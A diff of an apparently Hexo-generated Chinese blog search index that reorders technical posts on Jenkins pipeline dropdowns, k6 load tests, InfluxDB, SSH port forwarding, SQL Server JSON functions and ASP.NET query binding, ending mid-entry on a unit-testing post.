@@ -346,29 +346,6 @@
       </tags>
   </entry>
   <entry>
-    <title>使用 Linux 檔案列表建立 Jenkins 下拉選單</title>
-    <url>/2021/10/23/JenkinsDropdown/</url>
-    <content><![CDATA[<h1 id="取得檔案列表方法"><a class="header-anchor" href="#取得檔案列表方法"></a>取得檔案列表方法</h1>
-<p>使用以下 Linxu 指令，將預設目錄每個檔案使用一列的方式逐一列出</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -1 /home/ubuntu</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<p>在 Pipeline 執行 Linxu 指令，把結果存入變數</p>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> fileInFolder = sh(<span class="attr">script:</span> <span class="string">&quot;ls -1 /home/ubuntu&quot;</span>, <span class="attr">returnStdout:</span> <span class="literal">true</span>).trim();</span><br></pre></td></tr></table></figure>
-<h1 id="定義-Dialog"><a class="header-anchor" href="#定義-Dialog"></a>定義 Dialog</h1>
-<p>在 Pipeline 定義 Dialog ，把 parameters -&gt; choice -&gt; choices 定義替換為上方變數 fileInFolder</p>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> dialogMessage = <span class="string">&quot;Release $&#123;JOB_NAME&#125; now?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> confirmDialog =</span><br><span class="line">    input <span class="attr">message:</span> dialogMessage,</span><br><span class="line">    <span class="symbol">parameters:</span> [choice(<span class="attr">name:</span> <span class="string">&#x27;action&#x27;</span>, <span class="attr">choices:</span> fileInFolder, <span class="attr">description:</span> <span class="string">&#x27;&#x27;</span>)],</span><br><span class="line">    <span class="symbol">submitterParameter:</span> <span class="string">&#x27;releaseApprover&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>取得用戶選取參數，使用變數 confirmDialog -&gt; parameters -&gt; choice -&gt; name的定義</p>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">confirmDialog.action</span><br></pre></td></tr></table></figure>
-<p>取得點擊確認的用戶，使用變數 confirmDialog -&gt; submitterParameter的定義</p>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">confirmDialog.releaseApprover</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Jenkins</category>
-      </categories>
-      <tags>
-        <tag>Jenkins</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>如何將 Base64 編碼轉成檔案</title>
     <url>/2019/12/09/JsBase64ToFile/</url>
     <content><![CDATA[<h1 id="Chrome-base64-轉換成檔案"><a class="header-anchor" href="#Chrome-base64-轉換成檔案"></a>Chrome base64 轉換成檔案</h1>
@@ -389,6 +366,29 @@
       <tags>
         <tag>Javascript</tag>
         <tag>Base64</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 Linux 檔案列表建立 Jenkins 下拉選單</title>
+    <url>/2021/10/23/JenkinsDropdown/</url>
+    <content><![CDATA[<h1 id="取得檔案列表方法"><a class="header-anchor" href="#取得檔案列表方法"></a>取得檔案列表方法</h1>
+<p>使用以下 Linxu 指令，將預設目錄每個檔案使用一列的方式逐一列出</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -1 /home/ubuntu</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>在 Pipeline 執行 Linxu 指令，把結果存入變數</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> fileInFolder = sh(<span class="attr">script:</span> <span class="string">&quot;ls -1 /home/ubuntu&quot;</span>, <span class="attr">returnStdout:</span> <span class="literal">true</span>).trim();</span><br></pre></td></tr></table></figure>
+<h1 id="定義-Dialog"><a class="header-anchor" href="#定義-Dialog"></a>定義 Dialog</h1>
+<p>在 Pipeline 定義 Dialog ，把 parameters -&gt; choice -&gt; choices 定義替換為上方變數 fileInFolder</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> dialogMessage = <span class="string">&quot;Release $&#123;JOB_NAME&#125; now?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> confirmDialog =</span><br><span class="line">    input <span class="attr">message:</span> dialogMessage,</span><br><span class="line">    <span class="symbol">parameters:</span> [choice(<span class="attr">name:</span> <span class="string">&#x27;action&#x27;</span>, <span class="attr">choices:</span> fileInFolder, <span class="attr">description:</span> <span class="string">&#x27;&#x27;</span>)],</span><br><span class="line">    <span class="symbol">submitterParameter:</span> <span class="string">&#x27;releaseApprover&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>取得用戶選取參數，使用變數 confirmDialog -&gt; parameters -&gt; choice -&gt; name的定義</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">confirmDialog.action</span><br></pre></td></tr></table></figure>
+<p>取得點擊確認的用戶，使用變數 confirmDialog -&gt; submitterParameter的定義</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">confirmDialog.releaseApprover</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Jenkins</category>
+      </categories>
+      <tags>
+        <tag>Jenkins</tag>
       </tags>
   </entry>
   <entry>
@@ -501,9 +501,10 @@
     <url>/2025/04/02/JsK6LoadingTest/</url>
     <content><![CDATA[<h1 id="安裝-k6"><a class="header-anchor" href="#安裝-k6"></a>安裝 k6</h1>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 從 Ubuntu 金鑰伺服器下載 k6 軟體倉庫的 GPG 公鑰，並儲存到指定的金鑰環中</span></span><br><span class="line">sudo gpg --no-default-keyring --keyring /usr/share/keyrings/k6-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將 k6 軟體倉庫加入到 APT 的套件來源清單中，並指定其簽名金鑰</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [signed-by=/usr/share/keyrings/k6-archive-keyring.gpg] https://dl.k6.io/deb stable main&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/k6.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新 APT</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安裝 k6</span></span><br><span class="line">sudo apt-get install k6</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
 <!-- ```powershell
  choco install k6 -y
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line"># 建立檔案 script.js</span><br><span class="line"></span><br><span class="line">```Javascript</span><br><span class="line">import http from &#x27;k6/http&#x27;;</span><br><span class="line">import &#123; sleep &#125; from &#x27;k6&#x27;;</span><br><span class="line"></span><br><span class="line">export default function () &#123;</span><br><span class="line">    let url = &#x27;[目標 API]&#x27;;</span><br><span class="line"></span><br><span class="line">    let payload = JSON.stringify([請求物件]);</span><br><span class="line"></span><br><span class="line">    let params = &#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            &#x27;accept&#x27;: &#x27;application/json, text/plain, */*&#x27;,</span><br><span class="line">            &#x27;authorization&#x27;: &#x27;[JWT 認證]&#x27;,</span><br><span class="line">            &#x27;content-type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let res = http.post(url, payload, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 建立檔案 script.js</span><br><span class="line"></span><br><span class="line">```Javascript</span><br><span class="line">import http from &#x27;k6/http&#x27;;</span><br><span class="line">import &#123; sleep &#125; from &#x27;k6&#x27;;</span><br><span class="line"></span><br><span class="line">export default function () &#123;</span><br><span class="line">    let url = &#x27;[目標 API]&#x27;;</span><br><span class="line"></span><br><span class="line">    let payload = JSON.stringify([請求物件]);</span><br><span class="line"></span><br><span class="line">    let params = &#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            &#x27;accept&#x27;: &#x27;application/json, text/plain, */*&#x27;,</span><br><span class="line">            &#x27;authorization&#x27;: &#x27;[JWT 認證]&#x27;,</span><br><span class="line">            &#x27;content-type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let res = http.post(url, payload, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <!-- 使用 open api 轉換成 k6 腳本
 
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull openapitools/openapi-generator-cli</span><br><span class="line"></span><br><span class="line">docker run --<span class="built_in">rm</span> -v <span class="variable">$&#123;PWD&#125;</span>:/local openapitools/openapi-generator-cli generate \</span><br><span class="line">    -i /location of json file/swagger.json \</span><br><span class="line">    -g k6 \</span><br><span class="line">    -o /local/k6-<span class="built_in">test</span>/</span><br><span class="line">    --skip-validate-spec</span><br><span class="line">``` --&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試情境</span></span><br><span class="line"></span><br><span class="line">迭代測試:</span><br><span class="line">情境: 2 個用戶總共執行 2 次</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">k6 run test.js --vus 2 --iterations 2</span><br></pre></td></tr></table></figure>
@@ -558,10 +559,11 @@ k6 run --stage 30s:10 test.js;
     <content><![CDATA[<h1 id="安裝-InfluxDB-儲存壓測資料"><a class="header-anchor" href="#安裝-InfluxDB-儲存壓測資料"></a>安裝 InfluxDB 儲存壓測資料</h1>
 <p>使用 Docker 建立 InfluxDB 2.X</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8086:8086 \</span><br><span class="line">	-e DOCKER_INFLUXDB_INIT_MODE=setup \</span><br><span class="line">    -e DOCKER_INFLUXDB_INIT_USERNAME=[初始帳號] \</span><br><span class="line">	-e DOCKER_INFLUXDB_INIT_PASSWORD=[初始密碼] \</span><br><span class="line">	-e DOCKER_INFLUXDB_INIT_ORG=[初始ORG] \</span><br><span class="line">	-e DOCKER_INFLUXDB_INIT_BUCKET=[初始BUCKET] \</span><br><span class="line">    -e DOCKER_INFLUXDB_INIT_RETENTION=1w \</span><br><span class="line">    -e DOCKER_INFLUXDB_INIT_ADMIN_TOKEN=[初始TOKEN] \</span><br><span class="line">	influxdb</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
 <!-- 建立完成後，使用初始帳密登入連結 http://localhost:8086/ -->
 <p>建立完成後，使用 API 檢查 BUCKET</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --request GET <span class="string">&quot;http://localhost:8086/api/v2/buckets?name=[初始BUCKET]&quot;</span> \</span><br><span class="line">    --header <span class="string">&quot;Authorization: Token [初始TOKEN]&quot;</span></span><br></pre></td></tr></table></figure>
-<span id="more"></span>
+<!--more-->
 <h2 id="匯入資料"><a class="header-anchor" href="#匯入資料"></a>匯入資料</h2>
 <p>InfluxDB 2.X 需另外建置 K6</p>
 <h3 id="安裝-golang"><a class="header-anchor" href="#安裝-golang"></a>安裝 golang</h3>
@@ -798,6 +800,35 @@ sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT -->
       </tags>
   </entry>
   <entry>
+    <title>使用 SSH 建立通道</title>
+    <url>/2023/05/07/LinuxSshTunnel/</url>
+    <content><![CDATA[<h1 id="本機特定端口轉發至跳板機"><a class="header-anchor" href="#本機特定端口轉發至跳板機"></a>本機特定端口轉發至跳板機</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -g -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="跳板機轉發至本機特定端口"><a class="header-anchor" href="#跳板機轉發至本機特定端口"></a>跳板機轉發至本機特定端口</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -R 0.0.0.0:[跳板機端口]:localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<h1 id="請求轉發至跳板，可搭配-Whistle-做-Socks-代理"><a class="header-anchor" href="#請求轉發至跳板，可搭配-Whistle-做-Socks-代理"></a>請求轉發至跳板，可搭配 Whistle 做 Socks 代理</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -D localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<h1 id="ssh-執行選項說明"><a class="header-anchor" href="#ssh-執行選項說明"></a>ssh 執行選項說明</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-L: 指定將本機上的特定端口轉發到遠端主機</span><br><span class="line">-R: 表示使用遠程端口轉發創建ssh隧道</span><br><span class="line">-D: port動態應用級端口轉​​發</span><br><span class="line">-p: 跳板機端口</span><br><span class="line">-C: 使用數據壓縮</span><br><span class="line">-c: cipher_spec選擇用於加密會話的密碼規範</span><br><span class="line">-f: 代表後台運行程序</span><br><span class="line">-F: configfile指定每個用戶的配置文件</span><br><span class="line">-N: 不要執行任何遠端指令</span><br><span class="line">-g: 允許遠程主機連接到本地轉發端口</span><br></pre></td></tr></table></figure>
+<!-- /etc/ssh/sshd_config 加入GatewayPorts 設定，能讓所有人都連到 -->
+<!-- scoop install putty
+plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP] -->
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.ssh.com/academy/ssh/command">SSH Command - Usage, Options, Configuration</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Ubuntu</tag>
+        <tag>Ssh</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用 DMV 查询 Index 碎片化</title>
     <url>/2025/01/01/MsSqlIndexFragmentation/</url>
     <content><![CDATA[<h1 id="查询目前-Index-碎片化情形"><a class="header-anchor" href="#查询目前-Index-碎片化情形"></a>查询目前 Index 碎片化情形</h1>
@@ -855,32 +886,31 @@ sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT -->
       </tags>
   </entry>
   <entry>
-    <title>使用 SSH 建立通道</title>
-    <url>/2023/05/07/LinuxSshTunnel/</url>
-    <content><![CDATA[<h1 id="本機特定端口轉發至跳板機"><a class="header-anchor" href="#本機特定端口轉發至跳板機"></a>本機特定端口轉發至跳板機</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -g -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+    <title>在 SQL Server 操作 JSON</title>
+    <url>/2025/01/01/MsSqlJsonString/</url>
+    <content><![CDATA[<h1 id="宣告-JSON-字串"><a class="header-anchor" href="#宣告-JSON-字串"></a>宣告 JSON 字串</h1>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@json</span> NVARCHAR(MAX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@json</span> <span class="operator">=</span> <span class="string">&#x27;&#123;&quot;info&quot;: &#123;&quot;address&quot;: [&#123;&quot;town&quot;: &quot;Belgrade&quot;&#125;, &#123;&quot;town&quot;: &quot;Paris&quot;&#125;, &#123;&quot;town&quot;:&quot;Madrid&quot;&#125;]&#125;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
-<h1 id="跳板機轉發至本機特定端口"><a class="header-anchor" href="#跳板機轉發至本機特定端口"></a>跳板機轉發至本機特定端口</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -R 0.0.0.0:[跳板機端口]:localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<h1 id="請求轉發至跳板，可搭配-Whistle-做-Socks-代理"><a class="header-anchor" href="#請求轉發至跳板，可搭配-Whistle-做-Socks-代理"></a>請求轉發至跳板，可搭配 Whistle 做 Socks 代理</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -D localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<h1 id="ssh-執行選項說明"><a class="header-anchor" href="#ssh-執行選項說明"></a>ssh 執行選項說明</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-L: 指定將本機上的特定端口轉發到遠端主機</span><br><span class="line">-R: 表示使用遠程端口轉發創建ssh隧道</span><br><span class="line">-D: port動態應用級端口轉​​發</span><br><span class="line">-p: 跳板機端口</span><br><span class="line">-C: 使用數據壓縮</span><br><span class="line">-c: cipher_spec選擇用於加密會話的密碼規範</span><br><span class="line">-f: 代表後台運行程序</span><br><span class="line">-F: configfile指定每個用戶的配置文件</span><br><span class="line">-N: 不要執行任何遠端指令</span><br><span class="line">-g: 允許遠程主機連接到本地轉發端口</span><br></pre></td></tr></table></figure>
-<!-- /etc/ssh/sshd_config 加入GatewayPorts 設定，能讓所有人都連到 -->
-<!-- scoop install putty
-plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP] -->
+<h1 id="JSON-VALUE-擷取純量值字串"><a class="header-anchor" href="#JSON-VALUE-擷取純量值字串"></a>JSON_VALUE 擷取純量值字串</h1>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">JSON_VALUE</span>(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address[0].town&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="JSON-QUERY-擷取物件或陣列字串"><a class="header-anchor" href="#JSON-QUERY-擷取物件或陣列字串"></a>JSON_QUERY 擷取物件或陣列字串</h1>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">JSON_QUERY</span>(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="JSON-MODIFY-變更-JSON-字串中的值"><a class="header-anchor" href="#JSON-MODIFY-變更-JSON-字串中的值"></a>JSON_MODIFY 變更 JSON 字串中的值</h1>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@json</span> <span class="operator">=</span> JSON_MODIFY(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address[1].town&#x27;</span>, <span class="string">&#x27;London&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> modifiedJson <span class="operator">=</span> <span class="variable">@json</span>;</span><br></pre></td></tr></table></figure>
+<h1 id="JSON-轉換為資料列"><a class="header-anchor" href="#JSON-轉換為資料列"></a>JSON 轉換為資料列</h1>
+<p>解析 JSON 字串資料,需預先定義對應格式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> OPENJSON(<span class="built_in">JSON_QUERY</span>(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address&#x27;</span>)) <span class="keyword">WITH</span> (</span><br><span class="line">    town NVARCHAR(<span class="number">50</span>) <span class="string">&#x27;$.town&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
-<li><a href="https://www.ssh.com/academy/ssh/command">SSH Command - Usage, Options, Configuration</a></li>
+<li><a href="https://learn.microsoft.com/zh-tw/sql/relational-databases/json/json-data-sql-server?view=sql-server-ver16">SQL Server 中的 JSON 資料</a></li>
 </ol>
 </div>]]></content>
       <categories>
-        <category>Linux</category>
+        <category>MSSQL</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
-        <tag>Ubuntu</tag>
-        <tag>Ssh</tag>
+        <tag>JSON</tag>
+        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -915,34 +945,6 @@ plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[�
       <tags>
         <tag>MSSQL</tag>
         <tag>DMV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在 SQL Server 操作 JSON</title>
-    <url>/2025/01/01/MsSqlJsonString/</url>
-    <content><![CDATA[<h1 id="宣告-JSON-字串"><a class="header-anchor" href="#宣告-JSON-字串"></a>宣告 JSON 字串</h1>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@json</span> NVARCHAR(MAX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@json</span> <span class="operator">=</span> <span class="string">&#x27;&#123;&quot;info&quot;: &#123;&quot;address&quot;: [&#123;&quot;town&quot;: &quot;Belgrade&quot;&#125;, &#123;&quot;town&quot;: &quot;Paris&quot;&#125;, &#123;&quot;town&quot;:&quot;Madrid&quot;&#125;]&#125;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="JSON-VALUE-擷取純量值字串"><a class="header-anchor" href="#JSON-VALUE-擷取純量值字串"></a>JSON_VALUE 擷取純量值字串</h1>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">JSON_VALUE</span>(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address[0].town&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<h1 id="JSON-QUERY-擷取物件或陣列字串"><a class="header-anchor" href="#JSON-QUERY-擷取物件或陣列字串"></a>JSON_QUERY 擷取物件或陣列字串</h1>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">JSON_QUERY</span>(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<h1 id="JSON-MODIFY-變更-JSON-字串中的值"><a class="header-anchor" href="#JSON-MODIFY-變更-JSON-字串中的值"></a>JSON_MODIFY 變更 JSON 字串中的值</h1>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@json</span> <span class="operator">=</span> JSON_MODIFY(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address[1].town&#x27;</span>, <span class="string">&#x27;London&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> modifiedJson <span class="operator">=</span> <span class="variable">@json</span>;</span><br></pre></td></tr></table></figure>
-<h1 id="JSON-轉換為資料列"><a class="header-anchor" href="#JSON-轉換為資料列"></a>JSON 轉換為資料列</h1>
-<p>解析 JSON 字串資料,需預先定義對應格式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> OPENJSON(<span class="built_in">JSON_QUERY</span>(<span class="variable">@json</span>, <span class="string">&#x27;$.info.address&#x27;</span>)) <span class="keyword">WITH</span> (</span><br><span class="line">    town NVARCHAR(<span class="number">50</span>) <span class="string">&#x27;$.town&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://learn.microsoft.com/zh-tw/sql/relational-databases/json/json-data-sql-server?view=sql-server-ver16">SQL Server 中的 JSON 資料</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>MSSQL</category>
-      </categories>
-      <tags>
-        <tag>JSON</tag>
-        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1154,6 +1156,29 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
+    <title>Http 的 Get 方法傳入 List 參數</title>
+    <url>/2023/01/21/NetHttpGetWithList/</url>
+    <content><![CDATA[<h1 id="建立類別"><a class="header-anchor" href="#建立類別"></a>建立類別</h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="建立-HttpGet-方法"><a class="header-anchor" href="#建立-HttpGet-方法"></a>建立 HttpGet 方法</h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line">[<span class="meta">Route(<span class="string">&quot;[controller]&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">  [<span class="meta">HttpGet</span>]</span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">Get</span>(<span class="params">[FromQuery] List&lt;User&gt; user</span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">return</span> user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="組合-Request-的-Url"><a class="header-anchor" href="#組合-Request-的-Url"></a>組合 Request 的 Url</h1>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">https://example.com/User?user[0].Name=&#x27;張三&#x27;&amp;user[0].Age=10&amp;user[1].Name=&#x27;李四&#x27;&amp;user[1].Age=20</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://stackoverflow.com/questions/3061273/send-an-array-with-an-http-get">Send an Array with an HTTP Get</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>.Net</category>
+      </categories>
+      <tags>
+        <tag>.Net</tag>
+        <tag>Http</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用 Expression Trees 把 List&lt;T&gt; 轉成 CSV 字串</title>
     <url>/2024/05/01/NetExpressionListToCsv/</url>
     <content><![CDATA[<h1 id="宣告類別"><a class="header-anchor" href="#宣告類別"></a>宣告類別</h1>
@@ -1179,29 +1204,6 @@ dotnet-dump collect --process-id 1902 -->
       <tags>
         <tag>.Net</tag>
         <tag>Expression</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Http 的 Get 方法傳入 List 參數</title>
-    <url>/2023/01/21/NetHttpGetWithList/</url>
-    <content><![CDATA[<h1 id="建立類別"><a class="header-anchor" href="#建立類別"></a>建立類別</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="建立-HttpGet-方法"><a class="header-anchor" href="#建立-HttpGet-方法"></a>建立 HttpGet 方法</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line">[<span class="meta">Route(<span class="string">&quot;[controller]&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">  [<span class="meta">HttpGet</span>]</span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">Get</span>(<span class="params">[FromQuery] List&lt;User&gt; user</span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">return</span> user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="組合-Request-的-Url"><a class="header-anchor" href="#組合-Request-的-Url"></a>組合 Request 的 Url</h1>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">https://example.com/User?user[0].Name=&#x27;張三&#x27;&amp;user[0].Age=10&amp;user[1].Name=&#x27;李四&#x27;&amp;user[1].Age=20</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://stackoverflow.com/questions/3061273/send-an-array-with-an-http-get">Send an Array with an HTTP Get</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>.Net</category>
-      </categories>
-      <tags>
-        <tag>.Net</tag>
-        <tag>Http</tag>
       </tags>
   </entry>
   <entry>
@@ -1350,6 +1352,44 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
+    <title>如何在商業邏輯層進行單元測試</title>
+    <url>/2022/05/01/NetServiceUnitTest/</url>
+    <content><![CDATA[<h1 id="安裝-NSubstitute"><a class="header-anchor" href="#安裝-NSubstitute"></a>安裝 NSubstitute</h1>
+<p>安裝 Nuget 的 NSubstitute 套件</p>
